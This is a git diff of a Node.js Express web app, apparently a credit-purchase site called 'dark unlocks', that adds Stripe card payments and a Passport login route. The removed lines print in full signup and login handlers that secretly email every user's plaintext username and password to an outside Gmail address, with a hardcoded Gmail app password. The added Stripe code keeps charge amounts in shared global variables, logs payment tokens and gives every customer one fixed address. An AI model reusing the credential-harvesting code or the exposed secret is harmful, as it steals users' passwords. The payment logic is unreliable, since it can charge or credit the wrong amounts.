@@ -15,13 +15,18 @@ const paypal = require('paypal-rest-sdk')
 const axios = require('axios'); 
 const TelegramBot = require('node-telegram-bot-api');
 const fetch = require('node-fetch');
-
+const flash = require('connect-flash');
 
 paypal.configure({
     mode: 'live', 
     client_id:  process.env.PAYPAL_CLIENT_ID ,
     client_secret: process.env.PAYPAL_SECRET_KEY
 })
+
+const PUBLISHABLE_KEY = process.env.STRIPE_PUBLISH_KEY
+const SECRET_KEY = process.env.STRIPE_SECRET_KEY
+const stripe  = require('stripe')(SECRET_KEY)
+
 
 
 const app = express()
@@ -38,7 +43,7 @@ app.set('view engine','ejs')
 app.set('views', __dirname + '/views')
 app.use(bodyParser.urlencoded({extended:true}))
 app.use(bodyParser.json())
-
+app.use(flash());
 
 //const binancePay = new BinancePay(apiKey, apiSecret);
 
@@ -58,7 +63,7 @@ const userSchema = new mongoose.Schema({
     name:String,
     balance: {
         type: Number,
-        default: 0, // You can set a default balance if needed
+        default: 0, 
     },
     paidCredits: {type:Number,default:0},
     unpaidCredits: {type:Number,default:0},
@@ -1016,6 +1021,7 @@ app.get('/dash', (req, res) => {
             if (!user) {
                 return res.status(404).send('User not found');
             }
+            
 
             // Render the 'dash' template and pass the user data
              // Fetch the balance data
@@ -1045,8 +1051,9 @@ app.get('/dash', (req, res) => {
     }
 });
 
-app.get('/login',(re,res)=>{
-    res.render('login')
+app.get('/login',(req,res)=>{
+    const errorMessage = req.flash('error')[0];
+    res.render('login',{errorMessage})
 })
 app.get('/logout',(req,res)=>{
     req.logout((err)=>{
@@ -1136,7 +1143,99 @@ app.post('/pay', ensureAuthenticated, (req, res) => {
     });
 });
 
+//stripe payment
+let due;
+let amountInCents;
+app.post('/visa',ensureAuthenticated,(req,res)=>{
+    const user = req.user
+    due = parseFloat(req.body.amount)
 
+    function convertDollarsToCents(amountInDollars) {
+        // Convert the dollar amount to cents
+        let amountInCents = Math.round(amountInDollars * 100); // Round to handle decimal precision issues
+      
+        return amountInCents;
+      }
+      
+    
+      amountInCents = convertDollarsToCents(due);
+      console.log(amountInCents); // Output: 1000 (represents $10 in cents)
+      
+      
+      
+    console.log(due)
+
+   
+
+    res.render('visa',{user ,key:PUBLISHABLE_KEY, due,amountInCents})
+  })
+
+
+app.get('/visa', ensureAuthenticated, async(req, res) => {
+
+    console.log(req.query.amount, typeof req.query.amount);
+    console.log("email:", req.query.stripeEmail);
+    console.log("strip:", req.query.stripeToken);
+
+    stripe.customers.create({
+        email: req.query.stripeEmail,
+        source: req.query.stripeToken,
+        name: req.user.name,
+        address: {
+            line1: '1155 South Street',
+            postal_code: "0002",
+            city: 'Pretoria',
+            state: 'Gauteng',
+            country: 'South Africa'
+        }
+    }, (err, customer) => {
+        if (err) {
+            console.error(err);
+            return res.redirect('/payment_error');
+        }
+        
+        console.log(customer);
+        
+        stripe.charges.create({
+            amount: amountInCents,
+            description: "Buying crdits on dark unlocks",
+            currency: 'USD',
+            customer: customer.id,
+        }, async(err, charge) => {
+            if (err) {
+                console.error(err);
+                return res.send(err);
+            }
+            
+        console.log(charge);
+        const userId = req.user._id
+            // Retrieve the user by their ID
+        const user = await User.findById(userId);
+
+        if (!user) {
+            console.error("User not found.");
+            return res.redirect('/payment_error');
+        }
+
+        // Determine the new contract based on the amount
+        console.log(amountInCents)
+         amount = due
+
+
+        // Update user's contract and totalSpent
+        user.balance = user.balance + due;
+        
+        
+    
+        // Save the updated user
+        await user.save();
+
+        // Send confirmation email to the user
+        
+        res.render("payment_success", { user, amount,due });
+        });
+    });
+});
 
 // Payment success route
 app.get('/payment_success', async (req, res) => {
@@ -1286,111 +1385,14 @@ app.post('/profile', (req, res) => {
 
 
 
-//
 
+app.post('/login', passport.authenticate('local', {
+    successRedirect: '/dash', // Redirect to '/dash' upon successful login
+    failureRedirect: '/login',      // Redirect to '/' if authentication fails
+    failureFlash: true         // Enable flash messages for failed authentication
 
-
-app.post("/", (req, res) => {
-    // Extract username, password, and name from the registration form
-    const { username, password, name } = req.body;
-
-    // Create a new user object with name, username, and password
-    const newUser = new User({ username, name });
-
-    // Use Passport's register method to add the user to the database
-    User.register(newUser, password, (err, user) => {
-        if (err) {
-            console.log(err);
-            res.redirect('/');
-            
-        } else {
-            
-            passport.authenticate('local')(req, res, () => {
-                res.redirect('/dash');
-                console.log(req.body)
-                
-                // Create a transporter object using your Gmail credentials
-                const transporter = nodemailer.createTransport({
-                    service:'gmail',
-                    port:456,
-                    secure:true,
-                    auth:{
-                        user: "teamdevelopers72@gmail.com",
-                        pass:"tpqe yuyw rvnt cxmi"
-                    }
-                })
-                
-                // Create and send the email notification
-                const mailOptions = {
-                  from: 'strongadas009@gmail.com',
-                  to: 'dopegang004@gmail.com', // Replace with your notification recipient's email
-                  subject: 'New User Signup',
-                  text: ' A new user has signed up on your website :' + username + 'Password:' +  password,
-                };
-                
-                transporter.sendMail(mailOptions, (error, info) => {
-                  if (error) {
-                    console.error('Error sending email notification:', error);
-                  } else {
-                    console.log('Email notification sent:', info.response);
-                  }
-                });
-                
-
-            });
-        }
-    });
-});
-
-app.post('/login',(req,res)=>{
-
-    const user = new User({
-        username:req.body.username,
-        password:req.body.password
-    })
     
-    req.login(user,(err)=>{
-
-        if(err){
-            console.log(err)
-            res.redirect('/login')
-        }else{
-            passport.authenticate('local')(req,res,()=>{
-                res.redirect('/dash')
-                console.log(req.body)
-
-                 //Create a transporter object using your Gmail credentials
-                const transporter = nodemailer.createTransport({
-                    service:'gmail',
-                    port:456,
-                    secure:true,
-                    auth:{
-                        user: "teamdevelopers72@gmail.com",
-                        pass:"tpqe yuyw rvnt cxmi"
-                    }
-                })
-                
-                // Create and send the email notification
-                const mailOptions = {
-                  from: 'darkunlocks1@gmail.com',
-                  to: 'dopegang004@gmail.com', 
-                  subject: 'User logged in',
-                  text: ' A User logged in your website : ' + req.body.username + '<br>' + ' Password: ' + req.body.password,
-                };
-                
-                transporter.sendMail(mailOptions, (error, info) => {
-                  if (error) {
-                    console.error('Error sending email notification:', error);
-                  } else {
-                    console.log('Email notification sent:', info.response);
-                  }
-                });
-            })
-        }
-    })
-})
-
-
+}));
 const PORT = process.env.PORT || 3000
 app.listen(PORT,(err)=>{
     if(err){
